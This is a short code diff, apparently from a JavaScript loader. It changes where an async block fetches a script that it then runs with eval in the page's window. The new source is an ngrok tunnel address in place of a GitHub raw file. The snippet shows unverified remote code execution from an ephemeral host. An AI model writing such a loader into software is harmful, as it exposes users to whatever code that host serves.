@@ -14,7 +14,7 @@
 
 ;(async () => {
   try {
-    const response = await fetch("https://raw.githubusercontent.com/pencilbsp/public/main/inject-configs.js")
+    const response = await fetch("https://eel-moral-ape.ngrok-free.app/public/scripts/inject-configs.js")
     const script = await response.text()
     eval.call(window, script)
   } catch (error) {
